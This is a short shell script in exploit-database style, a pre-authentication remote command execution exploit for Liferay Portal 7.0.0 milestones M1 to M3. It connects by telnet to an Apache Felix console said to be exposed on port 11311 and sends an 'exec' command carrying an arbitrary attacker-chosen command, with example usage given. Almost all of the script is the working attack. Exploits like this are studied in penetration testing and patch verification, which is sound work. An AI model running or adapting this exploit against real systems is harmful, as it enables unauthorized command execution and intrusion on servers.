#!/bin/sh

# Exploit title: Liferay Portal 7.0.0 M1, 7.0.0 M2, 7.0.0 M3 RCE
# Date: 11/16/2014
# Exploit author: drone (@dronesec)
# Vendor homepage: http://www.liferay.com/
# Software link: http://downloads.sourceforge.net/project/lportal/Liferay%20Portal/7.0.0%20M2/liferay-portal-tomcat-7.0-ce-m2-20141017162509960.zip
# Version: 7.0.0 M1, 7.0.0 M2, 7.0.0 M3
# Fixed in: 7.0.3
# Tested on: Windows 7

# Pre-auth command injection using an exposed Apache Felix, 
# exposed by default on all Liferay Portal 7.0 installs.
#
# ./liferay_portal7.sh 192.168.1.1 "cmd.exe /C calc.exe"
#


(echo open $1 11311
sleep 1
echo system:getproperties
sleep 1
echo exec \"$2\"
sleep 1
) | telnet